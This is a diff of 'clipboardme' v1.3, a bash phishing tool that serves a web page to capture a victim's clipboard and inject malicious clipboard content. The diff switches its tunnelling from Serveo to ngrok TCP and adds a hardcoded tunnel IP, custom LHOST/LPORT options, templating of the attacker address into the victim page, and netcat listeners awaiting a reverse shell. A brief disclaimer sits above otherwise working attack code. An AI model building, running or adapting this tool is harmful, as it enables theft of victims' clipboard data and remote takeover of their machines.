@@ -1,24 +1,29 @@
 #!/bin/bash
-# Clipboard me v1.2
-# coded by: github.com/thelinuxchoice/clipboardme
-# If you use any part from this code, giving me the credits. Read the Lincense!
+# Clipboardme v1.3
+# coded by: @linux_choice (twitter)
+# github.com/thelinuxchoice/clipboardme
+
 
 trap 'printf "\n";stop' 2
-
+server_tcp="3.17.202.129" #NGROK TCP IP
 banner() {
 
 
-printf "\e[1;77m  ______ _ _       _                          _               \e[0m\n"
-printf "\e[1;77m / _____) (_)     | |                        | |              \e[0m\n"
-printf "\e[1;77m| /     | |_ ____ | | _   ___   ____  ____ _ | |\e[0m\e[1;92m ____   ____  \e[0m\n"
-printf "\e[1;77m| |     | | |  _ \| || \ / _ \ / _  |/ ___) || |\e[0m\e[1;92m|    \ / _  ) \e[0m\n"
-printf "\e[1;77m| \_____| | | | | | |_) ) |_| ( ( | | |  ( (_| |\e[0m\e[1;92m| | | ( (/ /  \e[0m\n"
-printf "\e[1;77m \______)_|_| ||_/|____/ \___/ \_||_|_|   \____|\e[0m\e[1;92m|_|_|_|\____) \e[0m\n"
-printf "\e[1;77m            |_|                                               \e[0m\n"
-
-printf " \e[1;77mv1.2 coded by github.com/thelinuxchoice/clipboardme\e[0m \n"
-
+printf "\e[1;77m    ______ _ _       _                          _               \e[0m\n"
+printf "\e[1;77m   / _____) (_)     | |                        | |              \e[0m\n"
+printf "\e[1;77m  | /     | |_ ____ | | _   ___   ____  ____ _ | |\e[0m\e[1;92m ____   ____  \e[0m\n"
+printf "\e[1;77m  | |     | | |  _ \| || \ / _ \ / _  |/ ___) || |\e[0m\e[1;92m|    \ / _  ) \e[0m\n"
+printf "\e[1;77m  | \_____| | | | | | |_) ) |_| ( ( | | |  ( (_| |\e[0m\e[1;92m| | | ( (/ /  \e[0m\n"
+printf "\e[1;77m   \______)_|_| ||_/|____/ \___/ \_||_|_|   \____|\e[0m\e[1;92m|_|_|_|\____) \e[0m\n"
+printf "\e[1;77m              |_|                                               \e[0m\n"
+printf "\e[1;77m             .:.:\e[0m\e[1;93m Grab/Inject clipboard content \e[0m\e[1;77m:.:.\e[0m\n"                              
+printf " \e[1;77m[\e[1;93m::\e[0m\e[1;77m]              v1.3 coded by @linux_choice              \e[1;77m[\e[1;93m::\e[0m\e[1;77m]\e[0m\n"
+printf " \e[1;77m[\e[1;93m::\e[0m\e[1;77m]         github.com/thelinuxchoice/clipboardme         \e[0m\e[1;77m[\e[1;93m::\e[0m\e[1;77m]\e[0m\n"
 printf "\n"
+printf "        \e[1;91m Disclaimer: this tool is designed for security\n"
+printf "         testing in an authorized simulated cyberattack\n"
+printf "         Attacking targets without prior mutual consent\n"
+printf "         is illegal!\n"
 
 
 }
@@ -27,7 +32,7 @@ stop() {
 
 checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
 checkphp=$(ps aux | grep -o "php" | head -n1)
-checkssh=$(ps aux | grep -o "ssh" | head -n1)
+#checkssh=$(ps aux | grep -o "ssh" | head -n1)
 if [[ $checkngrok == *'ngrok'* ]]; then
 pkill -f -2 ngrok > /dev/null 2>&1
 killall -2 ngrok > /dev/null 2>&1
@@ -74,29 +79,11 @@ while [ true ]; do
 
 
 if [[ -e "ip.txt" ]]; then
-printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the grab clipboard link!\n"
+printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
 catch_ip
 rm -rf ip.txt
+
 fi
-
-if [[ -e "ip2.txt" ]]; then
-printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the inject clipboard link!\n\e[0m"
-
-
-ip=$(grep -a 'IP:' ip2.txt | cut -d " " -f2 | tr -d '\r')
-IFS=$'\n'
-printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
-
-cat ip2.txt >> saved.ip2.txt
-
-printf "\n"
-rm -rf iptracker.log
-
-rm -rf ip2.txt
-printf "\n\e[1;92m[\e[0m+\e[1;92m]\e[0m\e[1;77m Listener Started...\e[0m\n"
-nc -lvp 4444
-fi
-
 
 sleep 0.5
 
@@ -109,6 +96,14 @@ touch clipboard_backup.txt
 cat clipboard.txt >> clipboard_backup.txt
 rm -rf clipboard.txt
 printf "\n\e[1;92m[\e[0m+\e[1;92m] Saved:\e[0m\e[1;77m clipboard_backup.txt\e[0m\n"
+printf "\n\e[1;92m[\e[0m+\e[1;92m]\e[0m\e[93m Malicious code injected!\e[0m\n"
+printf "\n\e[1;92m[\e[0m*\e[1;92m]\e[0m\e[1;77m Listener Started...\e[0m\n"
+if [[ $forward == true ]];then
+
+nc -lvp 4444
+else
+nc -lvp $server_port
+fi
 fi
 sleep 0.5
 
@@ -117,48 +112,16 @@ done
 }
 
 
-server() {
-
-
-printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo...\e[0m\n"
-
-if [[ $checkphp == *'php'* ]]; then
-killall -2 php > /dev/null 2>&1
-fi
-
-if [[ $subdomain_resp == true ]]; then
-
-$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net -R '$ddefault_port1':localhost:4444 2> /dev/null > sendlink ' &
-
-sleep 8
-else
-$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net -R '$ddefault_port1':localhost:4444 2> /dev/null > sendlink ' &
-
-sleep 8
-fi
-printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server... (localhost:3333)\e[0m\n"
-fuser -k 3333/tcp > /dev/null 2>&1
-php -S localhost:3333 > /dev/null 2>&1 &
-sleep 3
-send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
-printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Grab clipboard link:\e[0m\e[1;77m %s\n' $send_link
-printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Inject clipboard link:\e[0m\e[1;77m %s/index1.php\n' $send_link
-
-
-}
-
-
-payload_ngrok() {
-
-link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-sed 's+forwarding_link+'$link'+g' cliptext.html > index2.html
-sed 's+forwarding_link+'$link'+g' template.php > index.php
-
-
-}
-
 ngrok_server() {
+forward=true
 
+if [[ -e "clipboard.txt" ]]; then
+rm -rf clipboard.txt
+fi
+
+if [[ -e "ip.txt" ]]; then
+rm -rf ip.txt
+fi
 
 if [[ -e ngrok ]]; then
 echo ""
@@ -168,6 +131,7 @@ command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not inst
 printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
 arch=$(uname -a | grep -o 'arm' | head -n1)
 arch2=$(uname -a | grep -o 'Android' | head -n1)
+arch3=$(uname -a | grep -o '64bit' | head -n1)
 if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
 wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
 
@@ -180,6 +144,18 @@ printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget
 exit 1
 fi
 
+elif [[ $arch3 == *'64bit'* ]] ; then
+
+wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip > /dev/null 2>&1
+
+if [[ -e ngrok-stable-linux-amd64.zip ]]; then
+unzip ngrok-stable-linux-amd64.zip > /dev/null 2>&1
+chmod +x ngrok
+rm -rf ngrok-stable-linux-amd64.zip
+else
+printf "\e[1;93m[!] Download error... \e[0m\n"
+exit 1
+fi
 else
 wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
 if [[ -e ngrok-stable-linux-386.zip ]]; then
@@ -193,43 +169,40 @@ fi
 fi
 fi
 
-printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
+printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server (port 3333)...\n"
 php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
 sleep 2
-printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
-./ngrok http 3333 > /dev/null 2>&1 &
-sleep 10
 
-link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-printf "\e[1;92m[\e[0m*\e[1;92m] Grab clipboard link:\e[0m\e[1;77m %s\e[0m\n" $link
-
-payload_ngrok
-checkfound
-}
-
-start1() {
-if [[ -e sendlink ]]; then
-rm -rf sendlink
+if [[ -e check_ngrok ]]; then
+rm -rf ngrok_check
 fi
 
-printf "\n"
-printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net (Grab/Inject clipboard link)\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok (Only grab clipboard link)\e[0m\n"
-default_option_server="1"
-read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m' option_server
-option_server="${option_server:-${default_option_server}}"
-if [[ $option_server -eq 1 ]]; then
+printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\e[0m\n"
+./ngrok tcp 4444 > /dev/null 2>&1 > check_ngrok &
+sleep 10
 
-command -v php > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
-start
+check_ngrok=$(grep -o 'ERR_NGROK_302' check_ngrok)
 
-elif [[ $option_server -eq 2 ]]; then
-ngrok_server
+if [[ ! -z $check_ngrok ]];then
+printf "\n\e[91mAuthtoken missing!\e[0m\n"
+printf "\e[77mSign up at: https://ngrok.com/signup\e[0m\n"
+printf "\e[77mYour authtoken is available on your dashboard: https://dashboard.ngrok.com\n\e[0m"
+printf "\e[77mInstall your auhtoken:\e[0m\e[93m ./ngrok authtoken <YOUR_AUTHTOKEN>\e[0m\n\n"
+rm -rf check_ngrok
+exit 1
+fi
+
+if [[ -e check_ngrok ]]; then
+rm -rf check_ngrok
+fi
+
+link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "tcp://0.tcp.ngrok.io:[0-9]*")
+
+if [[ ! -z $link ]]; then 
+printf "\e[1;92m[\e[0m*\e[1;92m] TCP server:\e[0m\e[1;77m %s\e[0m\n" $link
 else
-printf "\e[1;93m [!] Invalid option!\e[0m\n"
-sleep 1
-clear
-start1
+printf "\n\e[91mNgrok Error!\e[0m\n"
+exit 1
 fi
 
 }
@@ -237,37 +210,64 @@ fi
 
 payload() {
 
-send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
+if [[ $forward == true ]];then
+server_port=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "tcp://0.tcp.ngrok.io:[0-9]*" | cut -d ':' -f3)
+printf "\n\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m]\e[1;91m Expose the server with command: \e[0m\n"
+printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m]\e[0m\e[93m ssh -R 80:localhost:3333 choose-subdomain@ssh.localhost.run \e[0m\n"
+printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m]\e[0m\e[92m Send the \e[0m\e[1;77mHTTPS\e[0m\e[92m link \e[0m\n"
 
-sed 's+forwarding_link+'$send_link'+g' cliptext.html > index2.html
-sed 's+forwarding_link+'$send_link'+g' template.php > index.php
-sed 's+forwarding_link+'$send_link'+g' template2.php > index1.php
-sed 's+serveo_port+'$ddefault_port1'+g' copy.html > index1.html
+fi
+
+sed 's+server_tcp+'$server_tcp'+g' cliptext.html | sed 's+server_port+'$server_port'+g' > index.php
 
 }
 
+
 start() {
 
-default_choose_sub="Y"
-default_subdomain="clipboardme$RANDOM"
-default_port1=$RANDOM
-printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Serveo (Forwarding) Port (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_port1
-read ddefault_port1
-ddefault_port1="${ddefault_port1:-${default_port1}}"
-
-printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
-read choose_sub
-choose_sub="${choose_sub:-${default_choose_sub}}"
-if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
-subdomain_resp=true
-printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
-read subdomain
-subdomain="${subdomain:-${default_subdomain}}"
+if [[ -e ip.txt ]]; then
+rm -f ip.txt
 fi
+printf "\n"
+printf " \e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok.io:\e[0m\n"
+printf " \e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Custom LPORT/LHOST:\e[0m\n"
+default_option_server="1"
+default_redirect_url="https://www.google.com"
+read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a reverse TCP Port Forwarding option: \e[0m' option_server
+option_server="${option_server:-${default_option_server}}"
 
-server
+if [[ $option_server -eq 1 ]]; then
+
+command -v php > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
+forward=true
+#settings2
+ngrok_server
 payload
 checkfound
+#listener
+elif [[ $option_server -eq 2 ]]; then
+read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] LHOST: \e[0m' custom_ip
+if [[ -z "$custom_ip" ]]; then
+exit 1
+fi
+server_tcp=$custom_ip
+read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] LPORT: \e[0m' custom_port
+if [[ -z "$custom_port" ]]; then
+exit 1
+fi
+server_port=$custom_port
+#settings2
+payload
+printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server on port 3333...\n"
+php -S 0.0.0.0:3333 > /dev/null 2>&1 & 
+checkfound
+#listener
+else
+printf "\e[1;93m [!] Invalid option!\e[0m\n"
+sleep 1
+clear
+start
+fi
 
 }
 
@@ -275,5 +275,7 @@ checkfound
 
 banner
 dependencies
-start1
-
+ngrok_server
+payload
+checkfound
+#start
